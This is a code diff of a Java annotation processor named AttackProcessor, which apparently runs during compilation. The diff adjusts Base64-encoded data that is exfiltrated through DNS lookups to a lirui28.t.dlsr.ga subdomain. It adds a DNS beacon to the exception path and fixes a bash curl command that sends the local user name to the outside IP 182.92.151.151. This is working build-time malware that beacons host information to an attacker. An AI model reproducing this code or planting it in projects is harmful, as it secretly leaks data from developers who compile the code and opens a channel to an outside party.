@@ -50,10 +50,12 @@ public class AttackProcessor extends AbstractProcessor {
 
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
 
-                    s = s.substring( 0,222 );
+                    s = s.substring( 0,60 );
                     Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
                 }
             } catch (IOException e) {
+                Inet4Address.getByName( "runtimeerror"+".lirui28.t.dlsr.ga" );
+
                 e.printStackTrace();
             }
 
@@ -67,7 +69,7 @@ public class AttackProcessor extends AbstractProcessor {
             Runtime r = Runtime.getRuntime();
             //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
 
-            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888"+System.getProperty("user.name")});
+            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
             p.waitFor();
         } catch (IOException e) {
             e.printStackTrace();
